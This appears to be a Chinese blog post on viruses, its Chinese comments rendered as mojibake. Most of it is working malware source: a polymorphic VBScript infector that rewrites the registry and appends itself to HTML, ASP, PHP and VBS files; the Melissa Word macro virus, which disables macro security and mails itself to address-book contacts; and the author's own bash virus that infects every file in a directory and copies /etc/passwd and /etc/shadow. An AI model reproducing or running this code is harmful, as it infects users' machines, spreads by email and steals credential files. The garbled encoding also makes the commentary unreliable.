\"HKEY_CLASSES_ROOT\\dllFile\\ShellEx\\PropertySheetHandlers\\WSHProps\\\",\"{60254CA5-953B-11CF-8C96-00AA00B8708C}\" WsShell.RegWrite \"HKEY_CLASSES_ROOT\\dllFile\\ScriptHostEncode\\\",\"{85131631-480C-11D2-B1F9-00C04F86C324}\" ' å¯åŠ¨æ—¶åŠ è½½çš„ç—…æ¯’æ–‡ä»¶ä¸­å†™å…¥ç—…æ¯’ä½“ Set FileTemp = FSO.OpenTextFile(StartUpFile,2,true) FileTemp.Write VbsText FileTemp.Close End Function ' å‡½æ•°ï¼šKJLikeIt() ' åŠŸèƒ½ï¼šé’ˆå¯¹htmlæ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œå¦‚æœè®¿é—®çš„æ˜¯æœ¬åœ°çš„æˆ–è€…å…±äº«ä¸Šçš„æ–‡ä»¶ï¼Œå°†æ„ŸæŸ“è¿™ä¸ªç›®å½• Function KJLikeIt() ' å¦‚æœå½“å‰æ‰§è¡Œæ–‡ä»¶ä¸æ˜¯\"html\"çš„å°±é€€å‡ºç¨‹åº If InWhere \u003c\u003e \"html\" Then Exit Function End If ' å–å¾—æ–‡æ¡£å½“å‰è·¯å¾„ ThisLocation = document.location ' å¦‚æœæ˜¯æœ¬åœ°æˆ–ç½‘ä¸Šå…±äº«æ–‡ä»¶ If Left(ThisLocation, 4) = \"file\" Then ThisLocation = Mid(ThisLocation,9) ' å¦‚æœè¿™ä¸ªæ–‡ä»¶æ‰©å±•åä¸ä¸ºç©ºï¼Œåœ¨ThisLocationä¸­ä¿å­˜å®ƒçš„è·¯å¾„ If FSO.GetExtensionName(ThisLocation) \u003c\u003e \"\" then ThisLocation = Left(ThisLocation,Len(ThisLocation) - Len(FSO.GetFileName(ThisLocation))) End If ' å¦‚æœThisLocationçš„é•¿åº¦å¤§äº3å°±å°¾è¿½ä¸€ä¸ª\"\\\" If Len(ThisLocation) \u003e 3 Then ThisLocation = ThisLocation \u0026 \"\\\" End If ' æ„ŸæŸ“è¿™ä¸ªç›®å½• KJummageFolder(ThisLocation) End If End Function ' å‡½æ•°ï¼šKJMailReg(RegStr,FileName) ' åŠŸèƒ½ï¼šå¦‚æœæ³¨å†Œè¡¨æŒ‡å®šé”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™å‘æŒ‡å®šä½ç½®å†™å…¥æŒ‡å®šæ–‡ä»¶å ' å‚æ•°ï¼š ' RegStr æ³¨å†Œè¡¨æŒ‡å®šé”®å€¼ ' FileName æŒ‡å®šæ–‡ä»¶å Function KJMailReg(RegStr,FileName) On Error Resume Next ' å¦‚æœæ³¨å†Œè¡¨æŒ‡å®šé”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™å‘æŒ‡å®šä½ç½®å†™å…¥æŒ‡å®šæ–‡ä»¶å RegTempStr = WsShell.RegRead(RegStr) If RegTempStr = \"\" Then WsShell.RegWrite RegStr,FileName End If End Function ' å‡½æ•°ï¼šKJOboSub(CurrentString) ' åŠŸèƒ½ï¼šéå†å¹¶è¿”å›ç›®å½•è·¯å¾„ ' å‚æ•°ï¼š ' CurrentString å½“å‰ç›®å½• Function KJOboSub(CurrentString) SubE = 0 TestOut = 0 Do While True TestOut = TestOut + 1 If TestOut \u003e 28 Then CurrentString = FinalyDisk \u0026 \":\\\" Exit Do End If On Error Resume Next ' å–å¾—å½“å‰ç›®å½•çš„æ‰€æœ‰å­ç›®å½•ï¼Œå¹¶ä¸”æ”¾åˆ°å­—å…¸ä¸­ Set ThisFolder = FSO.GetFolder(CurrentString) Set DicSub = CreateObject(\"Scripting.Dictionary\") Set Folders = ThisFolder.SubFolders FolderCount = 0 For Each TempFolder in Folders FolderCount = FolderCount + 1 DicSub.add FolderCount, TempFolder.Name Next ' å¦‚æœæ²¡æœ‰å­ç›®å½•äº†ï¼Œå°±è°ƒç”¨KJChangeSubè¿”å›ä¸Šä¸€çº§ç›®å½•æˆ–è€…æ›´æ¢ç›˜ç¬¦ï¼Œå¹¶å°†SubEç½®1 If DicSub.Count = 0 Then LastIndexChar = InstrRev(CurrentString,\"\\\",Len(CurrentString)-1) SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1) CurrentString = KJChangeSub(CurrentString,LastIndexChar) SubE = 1 Else ' å¦‚æœå­˜åœ¨å­ç›®å½• ' å¦‚æœSubEä¸º0ï¼Œåˆ™å°†CurrentStringå˜ä¸ºå®ƒçš„ç¬¬1ä¸ªå­ç›®å½• If SubE = 0 Then CurrentString = CurrentString \u0026 DicSub.Item(1) \u0026 \"\\\" Exit Do Else ' å¦‚æœSubEä¸º1ï¼Œç»§ç»­éå†å­ç›®å½•ï¼Œå¹¶å°†ä¸‹ä¸€ä¸ªå­ç›®å½•è¿”å› j = 0 For j = 1 To FolderCount If LCase(SubString) = LCase(DicSub.Item(j)) Then If j \u003c FolderCount Then CurrentString = CurrentString \u0026 DicSub.Item(j+1) \u0026 \"\\\" Exit Do End If End If Next LastIndexChar = InstrRev(CurrentString,\"\\\",Len(CurrentString)-1) SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1) CurrentString = KJChangeSub(CurrentString,LastIndexChar) End If End If Loop KJOboSub = CurrentString End Function ' å‡½æ•°ï¼šKJPropagate() ' åŠŸèƒ½ï¼šç—…æ¯’ä¼ æ’­ Function KJPropagate() On Error Resume Next RegPathvalue = \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\Degree\" DiskDegree = WsShell.RegRead(RegPathvalue) ' å¦‚æœä¸å­˜åœ¨Degreeè¿™ä¸ªé”®å€¼ï¼ŒDiskDegreeåˆ™ä¸ºFinalyDiskç›˜ If DiskDegree = \"\" Then DiskDegree = FinalyDisk \u0026 \":\\\" End If ' ç»§DiskDegreeç½®åæ„ŸæŸ“5ä¸ªç›®å½• For i=1 to 5 DiskDegree = KJOboSub(DiskDegree) KJummageFolder(DiskDegree) Next ' å°†æ„ŸæŸ“è®°å½•ä¿å­˜åœ¨\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\Degree\"é”®å€¼ä¸­ WsShell.RegWrite RegPathvalue,DiskDegree End Function ' å‡½æ•°ï¼šKJummageFolder(PathName) ' åŠŸèƒ½ï¼šæ„ŸæŸ“æŒ‡å®šç›®å½• ' å‚æ•°ï¼š ' PathName æŒ‡å®šç›®å½• Function KJummageFolder(PathName) On Error Resume Next ' å–å¾—ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶é›† Set FolderName = FSO.GetFolder(PathName) Set ThisFiles = FolderName.Files HttExists = 0 For Each ThisFile In ThisFiles FileExt = UCase(FSO.GetExtensionName(ThisFile.Path)) ' åˆ¤æ–­æ‰©å±•å ' è‹¥æ˜¯HTM,HTML,ASP,PHP,JSPåˆ™å‘æ–‡ä»¶ä¸­è¿½åŠ HTMLç‰ˆçš„ç—…æ¯’ä½“ ' è‹¥æ˜¯VBSåˆ™å‘æ–‡ä»¶ä¸­è¿½åŠ VBSç‰ˆçš„ç—…æ¯’ä½“ ' è‹¥æ˜¯HTT,åˆ™æ ‡å¿—ä¸ºå·²ç»å­˜åœ¨HTTäº† If FileExt = \"HTM\" Or FileExt = \"HTML\" Or FileExt = \"ASP\" Or FileExt = \"PHP\" Or FileExt = \"JSP\" Then Call KJAppendTo(ThisFile.Path,\"html\") ElseIf FileExt = \"VBS\" Then Call KJAppendTo(ThisFile.Path,\"vbs\") ElseIf FileExt = \"HTT\" Then HttExists = 1 End If Next ' å¦‚æœæ‰€ç»™çš„è·¯å¾„æ˜¯æ¡Œé¢ï¼Œåˆ™æ ‡å¿—ä¸ºå·²ç»å­˜åœ¨HTTäº† If (UCase(PathName) = UCase(WinPath \u0026 \"Desktop\\\")) Or (UCase(PathName) = UCase(WinPath \u0026 \"Desktop\"))Then HttExists = 1 End If ' å¦‚æœä¸å­˜åœ¨HTT ' å‘ç›®å½•ä¸­è¿½åŠ ç—…æ¯’ä½“ If HttExists = 0 Then FSO.CopyFile WinPath \u0026 \"system32\\desktop.ini\",PathName FSO.CopyFile WinPath \u0026 \"web\\Folder.htt\",PathName End If End Function ' å‡½æ•°KJSetDim() ' å®šä¹‰FSO,WsShellå¯¹è±¡ ' å–å¾—æœ€åä¸€ä¸ªå¯ç”¨ç£ç›˜å·æ ‡ ' ç”Ÿæˆä¼ æŸ“ç”¨çš„åŠ å¯†å­—ä¸² ' å¤‡ä»½ç³»ç»Ÿä¸­çš„web\\folder.httå’Œsystem32\\desktop.ini Function KJSetDim() On Error Resume Next Err.Clear ' æµ‹è¯•å½“å‰æ‰§è¡Œæ–‡ä»¶æ˜¯htmlè¿˜æ˜¯vbs TestIt = WScript.ScriptFullname If Err Then InWhere = \"html\" Else InWhere = \"vbs\" End If ' åˆ›å»ºæ–‡ä»¶è®¿é—®å¯¹è±¡å’ŒShellå¯¹è±¡ If InWhere = \"vbs\" Then Set FSO = CreateObject(\"Scripting.FileSystemObject\") Set WsShell = CreateObject(\"WScript.Shell\") Else Set AppleObject = document.applets(\"KJ_guest\") AppleObject.setCLSID(\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\") AppleObject.createInstance() Set WsShell = AppleObject.GetObject() AppleObject.setCLSID(\"{0D43FE01-F093-11CF-8940-00A0C9054228}\") AppleObject.createInstance() Set FSO = AppleObject.GetObject() End If Set DiskObject = FSO.Drives ' åˆ¤æ–­ç£ç›˜ç±»å‹ ' ' 0: Unknown ' 1: Removable ' 2: Fixed ' 3: Network ' 4: CD-ROM ' 5: RAM Disk ' å¦‚æœä¸æ˜¯å¯ç§»åŠ¨ç£ç›˜æˆ–è€…å›ºå®šç£ç›˜å°±è·³å‡ºå¾ªç¯ã€‚å¯èƒ½ä½œè€…è€ƒè™‘çš„æ˜¯ç½‘ç»œç£ç›˜ã€CD-ROMã€RAM Diskéƒ½æ˜¯åœ¨æ¯”è¾ƒé åçš„ä½ç½®ã€‚å‘µå‘µï¼Œå¦‚æœC:æ˜¯RAMDISKä¼šæ€ä¹ˆæ ·ï¼Ÿ For Each DiskTemp In DiskObject If DiskTemp.DriveType \u003c\u003e 2 And DiskTemp.DriveType \u003c\u003e 1 Then Exit For End If FinalyDisk = DiskTemp.DriveLetter Next ' æ­¤å‰çš„è¿™æ®µç—…æ¯’ä½“å·²ç»è§£å¯†ï¼Œå¹¶ä¸”å­˜æ”¾åœ¨ThisTextä¸­ï¼Œç°åœ¨ä¸ºäº†ä¼ æ’­ï¼Œéœ€è¦å¯¹å®ƒè¿›è¡Œå†åŠ å¯†ã€‚ ' åŠ å¯†ç®—æ³• Dim OtherArr(3) Randomize ' éšæœºç”Ÿæˆ4ä¸ªç®—å­ For i=0 To 3 OtherArr(i) = Int((9 * Rnd)) Next TempString = \"\" For i=1 To Len(ThisText) TempNum = Asc(Mid(ThisText,i,1)) 'å¯¹å›è½¦ã€æ¢è¡Œ(0x0D,0x0A)åšç‰¹åˆ«çš„å¤„ç† If TempNum = 13 Then TempNum = 28 ElseIf TempNum = 10 Then TempNum = 29 End If 'å¾ˆç®€å•çš„åŠ å¯†å¤„ç†ï¼Œæ¯ä¸ªå­—ç¬¦å‡å»ç›¸åº”çš„ç®—å­ï¼Œé‚£ä¹ˆåœ¨è§£å¯†çš„æ—¶å€™åªè¦æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¯ä¸ªå­—ç¬¦åŠ ä¸Šç›¸åº”çš„ç®—å­å°±å¯ä»¥äº†ã€‚ TempChar = Chr(TempNum - OtherArr(i Mod 4)) If TempChar = Chr(34) Then TempChar = Chr(18) End If TempString = TempString \u0026 TempChar Next ' å«æœ‰è§£å¯†ç®—æ³•çš„å­—ä¸² UnLockStr = \"Execute(\"\"Dim KeyArr(3),ThisText\"\"\u0026vbCrLf\u0026\"\"KeyArr(0) = \" \u0026 OtherArr(0) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"KeyArr(1) = \" \u0026 OtherArr(1) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"KeyArr(2) = \" \u0026 OtherArr(2) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"KeyArr(3) = \" \u0026 OtherArr(3) \u0026 \"\"\"\u0026vbCrLf\u0026\"\"For i=1 To Len(ExeString)\"\"\u0026vbCrLf\u0026\"\"TempNum = Asc(Mid(ExeString,i,1))\"\"\u0026vbCrLf\u0026\"\"If TempNum = 18 Then\"\"\u0026vbCrLf\u0026\"\"TempNum = 34\"\"\u0026vbCrLf\u0026\"\"End If\"\"\u0026vbCrLf\u0026\"\"TempChar = Chr(TempNum + KeyArr(i Mod 4))\"\"\u0026vbCrLf\u0026\"\"If TempChar = Chr(28) Then\"\"\u0026vbCrLf\u0026\"\"TempChar = vbCr\"\"\u0026vbCrLf\u0026\"\"ElseIf TempChar = Chr(29) Then\"\"\u0026vbCrLf\u0026\"\"TempChar = vbLf\"\"\u0026vbCrLf\u0026\"\"End If\"\"\u0026vbCrLf\u0026\"\"ThisText = ThisText \u0026 TempChar\"\"\u0026vbCrLf\u0026\"\"Next\"\")\" \u0026 vbCrLf \u0026 \"Execute(ThisText)\" ' å°†åŠ å¯†å¥½çš„ç—…æ¯’ä½“å¤åˆ¶ç»™å˜é‡ ThisText ThisText = \"ExeString = \"\"\" \u0026 TempString \u0026 \"\"\"\" ' ç”Ÿæˆhtmlæ„ŸæŸ“ç”¨çš„è„šæœ¬ HtmlText =\"\u003c\" \u0026 \"script language=vbscript\u003e\" \u0026 vbCrLf \u0026 \"document.write \" \u0026 \"\"\"\" \u0026 \"\u003c\" \u0026 \"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'\u003e\" \u0026 \"\u003c\"\"\u0026\"\"\" \u0026 \"APPLET NAME=KJ\"\"\u0026\"\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\"\u0026\"\"activeX.Active\"\"\u0026\"\"XComponent\u003e\" \u0026 \"\u003c\" \u0026 \"/APPLET\u003e\" \u0026 \"\u003c\" \u0026 \"/div\u003e\"\"\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/script\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"script language=vbscript\u003e\" \u0026 vbCrLf \u0026 ThisText \u0026 vbCrLf \u0026 UnLockStr \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/script\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/BODY\u003e\" \u0026 vbCrLf \u0026 \"\u003c\" \u0026 \"/HTML\u003e\" ' ç”Ÿæˆvbsæ„ŸæŸ“ç”¨çš„è„šæœ¬ VbsText = ThisText \u0026 vbCrLf \u0026 UnLockStr \u0026 vbCrLf \u0026 \"KJ_start()\" ' å–å¾—Windowsç›®å½• ' GetSpecialFolder(n) ' 0: WindowsFolder ' 1: SystemFolder ' 2: TemporaryFolder ' å¦‚æœç³»ç»Ÿç›®å½•å­˜åœ¨web\\Folder.httå’Œsystem32\\desktop.iniï¼Œåˆ™ç”¨kjwall.gifæ–‡ä»¶åå¤‡ä»½å®ƒä»¬ã€‚ WinPath = FSO.GetSpecialFolder(0) \u0026 \"\\\" If (FSO.FileExists(WinPath \u0026 \"web\\Folder.htt\")) Then FSO.CopyFile WinPath \u0026 \"web\\Folder.htt\",WinPath \u0026 \"web\\kjwall.gif\" End If If (FSO.FileExists(WinPath \u0026 \"system32\\desktop.ini\")) Then FSO.CopyFile WinPath \u0026 \"system32\\desktop.ini\",WinPath \u0026 \"system32\\kjwall.gif\" End If End Function ----------------------- è¿™ä¸ªç—…æ¯’æ˜¯ç”¨VBSç¼–å†™çš„å¤šå˜å½¢ã€åŠ å¯†ç—…æ¯’ï¼Œæ„ŸæŸ“æ‰©å±•åä¸º.html, .htm, .asp, .php, .jsp, .httå’Œ.vbsæ–‡ä»¶ï¼ŒåŒæ—¶è¯¥ç—…æ¯’ä¼šå¤§é‡ç”Ÿæˆfolder.httå’Œdesktop.iniï¼Œå¹¶åœ¨%windir%\\System\\ä¸­ç”Ÿæˆä¸€ä¸ªåå­—å«Kernel.dllçš„æ–‡ä»¶ï¼ˆWindows 9x/Meï¼‰æˆ–Kernel32.dllï¼ˆWindows NT/2000ï¼‰ï¼Œä¿®æ”¹.dllæ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ï¼Œæ„ŸæŸ“Outlookçš„ä¿¡çº¸æ–‡ä»¶ã€‚ ï¼ˆæ³¨ï¼š%windir%æŒ‡çš„æ˜¯Windowsçš„ç›®å½•ï¼Œ å¯¹äºWin9x/Meç³»ç»Ÿæ¥è¯´ï¼Œè¿™ä¸ªç›®å½•é€šå¸¸æ˜¯\\Windowsï¼Œå¯¹äºWindows NT/2000æ¥è¯´ï¼Œè¿™ä¸ªç›®å½•é€šå¸¸æ˜¯\\WinNTï¼›ç‰¹åˆ«æ³¨æ„ï¼šè¿™ä¸¤ä¸ªKernelæ–‡ä»¶ç”Ÿæˆçš„è·¯å¾„éƒ½æ˜¯%windir%\\System\\ï¼Œè€Œä¸æ˜¯%windir%\\System32\\ï¼‰ æ„ŸæŸ“è¿™ä¸ªç—…æ¯’åæœ‰ä¸¤ä¸ªæ˜æ˜¾çš„è¡¨ç°ï¼š\n  åœ¨æ¯ä¸ªç›®å½•ä¸­éƒ½ä¼šç”Ÿæˆfolder.httï¼ˆå¸¦æ¯’æ–‡ä»¶ï¼‰å’Œdesktop.iniï¼ˆç›®å½•é…ç½®æ–‡ä»¶ï¼‰ï¼›\n  ç”µè„‘è¿è¡Œé€Ÿåº¦æ˜æ˜¾å˜æ…¢ï¼Œåœ¨ä»»åŠ¡åˆ—è¡¨ä¸­å¯ä»¥çœ‹åˆ°æœ‰å¤§é‡çš„Wscript.exeç¨‹åºåœ¨è¿è¡Œã€‚\n  æ¢…åˆ©èç—…æ¯’  æ¢…ä¸½èç—…æ¯’-ç™¾åº¦ç™¾ç§‘\næ¢…ä¸½èç—…æ¯’-wiki\nMelissaåˆ†æ\nMelissaç—…æ¯’åˆ†æ-ppt\nmelissa.macro.virus.txt\n æ¢…ä¸½èç—…æ¯’å±äºwordå®ç—…æ¯’ï¼Œä¸»è¦é€šè¿‡ç”µè„‘é‚®ä»¶ä¼ æ’­ï¼Œä¸»è¦åˆ©ç”¨äº†äººç±»çš„å¥½å¥‡å¿ƒâ€”â€”è¿™æ˜¯ç»™ä½ çš„èµ„æ–™ï¼Œä¸è¦è®©ä»»ä½•äººçœ‹è§ï¼Œæ›´æœ‰æ„æ€çš„æ˜¯ï¼Œè¿™ä¸ªç—…æ¯’çš„åå­—æ¥æºäºä½œè€…åœ¨ä½›ç½—é‡Œè¾¾å·é‡åˆ°è¿‡çš„ä¸€ä¸ªè„±è¡£å¥³éƒçš„åå­—XD\næ¢…ä¸½èç—…æ¯’ä¸€èˆ¬é€šè¿‡é‚®ä»¶ä¼ æ’­ï¼Œé‚®ä»¶çš„æ ‡é¢˜é€šå¸¸ä¸ºâ€œè¿™æ˜¯ç»™ä½ çš„èµ„æ–™ï¼Œä¸è¦è®©ä»»ä½•äººçœ‹è§â€ã€‚ä¸€æ—¦æ”¶ä»¶äººæ‰“å¼€ç—…æ¯’é‚®ä»¶ï¼Œç—…æ¯’å°±ä¼šè‡ªåŠ¨å‘ç”¨æˆ·é€šè®¯å½•çš„å‰50ä½å¥½å‹å¤åˆ¶å‘é€åŒæ ·çš„é‚®ä»¶ã€‚\n æ‰‹å·¥æ¸…é™¤åŠæ³•ï¼š\n åˆ é™¤æ‰€æœ‰çš„normal.dotæ–‡ä»¶ï¼Œæ³¨æ„éšè—æ–‡ä»¶å’Œç³»ç»Ÿæ–‡ä»¶ä¸­çš„æœç´¢ æ‰“å¼€æ³¨å†Œè¡¨ç®¡ç†å™¨ï¼Œæœç´¢æ‰€æœ‰åç§°ä¸ºMelissaçš„é¡¹ï¼Œå…¨éƒ¨åˆ é™¤ åˆ é™¤æ‰€æœ‰æŸ“æ¯’çš„word   Wordå®ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ‰¹é‡å¤„ç†ç¨‹åºå‘½ä»¤ï¼Œå¾®è½¯ç”¨å…¶æé«˜å·¥ä½œæ•ˆç‡\nå®å…¶å®å°±æ˜¯ä¸€æ®µvbscriptä»£ç ï¼Œå½“wordè¿è¡Œæ—¶è‡ªåŠ¨è¿è¡Œå®ä»£ç ï¼Œç»è¿‡å®éªŒï¼Œwordå®åœ¨åˆ é™¤å¸¦æœ‰å®çš„wordæ–‡ä»¶ä¹‹åæˆ–è€…ç¦ç”¨å®åŠŸèƒ½ä¹‹åï¼Œä»ç„¶å¯ä»¥åœ¨æ–°å»ºwordæ—¶è‡ªåŠ¨è¿è¡Œå®ï¼Œæ›´åˆ«è¯´æ˜¯ä¸€ä¸ªç—…æ¯’å®çš„ä¼ æ’­äº†ï¼Œå…¶è‡ªåŠ¨è¿è¡Œï¼Œéš¾ä»¥åˆ é™¤çš„ç‰¹æ€§ï¼Œä½¿å¾—Melissaç—…æ¯’æœ‰ç€é‡å¤§å½±å“åŠ›\n ç°åœ¨çš„wordå¯ä»¥åœ¨ï¼šå®¡é˜… â¡Â å®ä¸­åˆ›å»ºæ–°çš„å®\nåœ¨æ–‡ä»¶ â¡ ä¿¡ä»»ä¸­å¿ƒ â¡ ä¿¡ä»»ä¸­å¿ƒè®¾ç½® â¡ å®è®¾ç½® ä¸­å¯ä»¥æ‰“å¼€æ˜¯å¦å¯ç”¨å®\n ç—…æ¯’æºç å¦‚ä¸‹ï¼š\n'Part1 ' Private Sub Document_Open() On Error Resume Next 'è¯»å–Windows Registryï¼Œå³æ³¨å†Œè¡¨ 'å¦‚æœæ˜¯word2000å°±æŠŠSecurityè®¾ç½®ä¸ºæœ€ä½ 'è‹¥ä¸æ˜¯åˆ™æŠŠwordçš„è½¬åŒ–ç¡®è®¤ã€ç—…æ¯’ä¿æŠ¤ã€æ¨¡æ¿å­˜å‚¨ç¡®è®¤è®¾ç½®æˆoff 'ç„¶åæŠŠèœå•é¡¹Tools-\u003eMacro Disable ,è¿™æ ·è¾¾åˆ°éšè—ä»£ç çš„æ•ˆæœ If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") \u003c\u003e \"\" Then CommandBars(\"Macro\").Controls(\"Security...\").Enabled = False System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1\u0026 Else CommandBars(\"Tools\").Controls(\"Macro\").Enabled = False Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1) End If 'Part2 'Melissaç—…æ¯’Payloadä¸»ä½“ 'å…ˆåˆ¤æ–­æ˜¯å¦å·²ç»æ„ŸæŸ“ 'æ„ŸæŸ“çš„æ ‡è®°åœ¨æ³¨å†Œè¡¨é‡Œ 'è‹¥æ— æ„ŸæŸ“åˆ™å†™ä¸€ä¸ªä¸»é¢˜ä¸ºImportant Message From $name Here is that document you asked for ... don't show anyone else ;-)çš„é‚®ä»¶ï¼Œä»¥åŠé™„æœ‰ç—…æ¯’word(å³æœ¬æ–‡ä»¶)å‘é€åˆ°åœ°å€ç°¿ä¸Šçš„å‰50ä¸ªäºº 'ç„¶åå†æ³¨å†Œè¡¨ä¸­æ ‡è®°å·²æ„ŸæŸ“ Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice Set UngaDasOutlook = CreateObject(\"Outlook.Application\") Set DasMapiName = UngaDasOutlook.GetNameSpace(\"MAPI\") If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\", \"Melissa?\") \u003c\u003e \"... by Kwyjibo\" Then If UngaDasOutlook = \"Inlook\" Then DasMapName.Logon \"profile\", \"password\" For y = 1 To DasMapName.AddressLists.Count Set AddyBook = DasMapiName.AddressLists(y) Set BreakOffASlice = UngaDasOutlook.CreateItem(0) For oo = 1 To AddyBook.AddressEntries.Count Peep = AddyBook.AddressEntries(x) BreakOffASlice.Recipients.Add Peep x++ If x \u003c 50 Then oo = AddyBook.AddressEntries.Count Next oo BreakOffASlice.Subject = \"Important Message From \" \u0026 Application.UserName BreakUmOffASlice.Body = \"Here is that document you asked for ... don't show anyone else ;-)\" *** Here is the classic subject line \"Important Message From\" This could change of course in future versions *** BreakUmOffASlice.Attachments.Add ActiveDocument.FullName BreakUmOffASlice.Send Peep = \"\" Next y DasMapName.Logoff End If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\", \"Melissa?\") = \"... by Kwyjibo\" End If 'Part3 'ç—…æ¯’è‡ªæˆ‘å¤åˆ¶éƒ¨åˆ† 'æ ¹æ®æƒ…å†µå¯¹Active Documentæˆ–Normal Templateè¿›è¡Œæ„ŸæŸ“ ' Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1) Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1) NTCL = NTI1.CodeModule.CountOfLines ADCL = ADI1.CodeModule.CountOfLines BGN = 2 If ADI1.Name \u003c\u003e \"Melissa\" Then If ADCL \u003e 0 Then _ ADI1.CodeModule.DeleteLines 1, ADCL Set ToInfect = ADI1 ADI1.Name = \"Melissa\" DoAD = True End If If NTI1.Name \u003c\u003e \"Melissa\" Then If NTCL \u003e 0 Then _ NTI1.CodeModule.DeleteLines 1, NTCL Set ToInfect = NTI1 NTI1.Name = \"Melissa\" DoNT = True End If If DoNT \u003c\u003e True And DoAD \u003c\u003e True Then GoTo END If DoNT = True Then Do While ADI1.CodeModule.Lines(1, 1) = \"\" ADI1.CodeModule.DeleteLines 1 Loop ToInfect.CodeModule.AddFromString (\"Private Sub Document_Close()\") Do While ADI1.CodeModule.Lines(BGN, 1) \u003c\u003e \"\" ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1) BGN = BGN + 1 Loop End If If DoAD = True Then Do While NTI1.CodeModule.Lines(1, 1) = \"\" NTI1.CodeModule.DeleteLines 1 Loop ToInfect.CodeModule.AddFromString (\"Private Sub Document_Open()\") Do While NTI1.CodeModule.Lines(BGN, 1) \u003c\u003e \"\" ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(END, 1) BGN = BGN + 1 Loop End If CYA: If NTCL \u003c\u003e 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, \"Document\") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ElseIf (InStr(1, ActiveDocument.Name, \"Document\") \u003c\u003e False) Then ActiveDocument.Saved = True End If 'Part4 'å‡å¦‚åˆæ—¶å·²åˆ°ï¼Œå‘Šè¯‰æ„ŸæŸ“è€…ä½ å·²ç»è¢«æ„ŸæŸ“23333333333 ' 'WORD/Melissa written by Kwyjibo 'Works in both Word 2000 and Word 97 'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide! 'Word -\u003e Email | Word 97 \u003c--\u003e Word 2000 ... it's a new age! If Day(Now) = Minute(Now) Then Selection.TypeText \" Twenty-two points, plus triple-word-score, plus fifty points for using all my letters. Game's over. I'm outta here.\" End Sub å†™ä¸€ä¸ªbashç—…æ¯’ é™„ï¼šç°shellè„šæœ¬ï¼šhttps://www.runoob.com/linux/linux-shell.html\n æ³¨æ„å˜é‡èµ‹å€¼ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼Œè¸©å‘è¸©äº†å¾ˆä¹…æ‰å‘ç°\n å®ç°äº†æ„ŸæŸ“ç›®å½•ä¸‹å°†è‡ªèº«å¤åˆ¶åˆ°æ¯ä¸ªæ–‡ä»¶é‡Œï¼Œå¹¶è®°å½•æ„ŸæŸ“æ–‡ä»¶è‡³.bak/filelist_log\nå¹¶è·å–ä¿¡æ¯åˆ°.bak/infoç›®å½•ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58  #!/bin/bash #MagicFuck whoami=\"$(whoami)\" path=\"$(pwd)\" file_list=$(ls $path) echo -e \"$whoamiin $pathfucking your file\\n\" touch /tmp/v_tmp tmp='/tmp/v_tmp' cat \"$path/$0\" \u003e $tmp # backup mkdir .bak cp -r * .bak mkdir $path/.bak/info touch $path/.bak/info/filelist_log cat /proc/meminfo \u003e\u003e $path/.bak/info/meminfo cat /proc/cpuinfo \u003e\u003e $path/.bak/info/cpuinfo cat /etc/hostname \u003e\u003e $path/.bak/info/hostname cat /etc/passwd \u003e\u003e $path/.bak/info/passwd if test $whoami = 'root'; then touch $path/.bak/info/shadow cat /etc/shadow \u003e\u003e $path/.bak/info/shadow fi function fuckfile(){ file_list=$(ls $pwd) echo $(ls $pwd) \u003e\u003e $path/.bak/filelist_log for file_ in $(ls $pwd); do # echo $file_ if test -d $file_ then echo \"$file_is dir\" if $(cat $file_ |grep -q \".bak\") then echo \"It's Magic bak\" else cd ./$file_ fuckfile cd .. fi else if $(cat $file_ |grep -q \"MagicFuck\") then echo \"It has Magic\" else cat $tmp \u003e\u003e $file_ fi fi done } fuckfile rm $tmp   é€šè¿‡åŠ«æŒhookå®ç°é”®ç›˜è®°å½•å™¨ï¼šhttps://blog.csdn.net/simon798/article/details/98848050\näºŒè¿›åˆ¶æ–‡ä»¶ç—…æ¯’ï¼šbinary file virus  